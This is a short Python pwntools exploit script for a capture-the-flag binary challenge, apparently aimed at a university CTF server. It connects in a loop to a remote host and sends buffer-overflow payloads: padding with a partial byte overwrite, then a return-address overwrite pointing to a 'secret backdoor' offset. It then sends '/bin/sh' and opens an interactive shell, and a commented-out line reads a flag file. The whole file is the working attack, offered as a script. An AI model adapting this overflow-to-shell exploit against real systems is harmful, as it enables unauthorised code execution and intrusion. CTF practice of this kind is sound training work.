#!/usr/bin/env python3

from pwn import *
import sys
from time import time

context.os = "linux"
context.arch = "amd64"
context.terminal = ["tmux", "new-window"]


exe = ELF("./bin_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    sSecretBackdoor = 0x746
    r = process([exe.path])
 
    cond = True
    while cond:
    # good luck pwning :)
        # r = process([exe.path])
        r = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10158)
        r.sendline(b"A"*40 + b"\xc6")
        r.sendline(b"Z"*0xc4 + p16(sSecretBackdoor)) # 0xc4 is the offset to eip but I removed this file and lost all those calculations done before
        r.sendline(b"/bin/sh\x00")
        # r.sendline(b"cat /home/ctf/flag\x00")
        r.interactive()
        r.close()


if __name__ == "__main__":
    main()
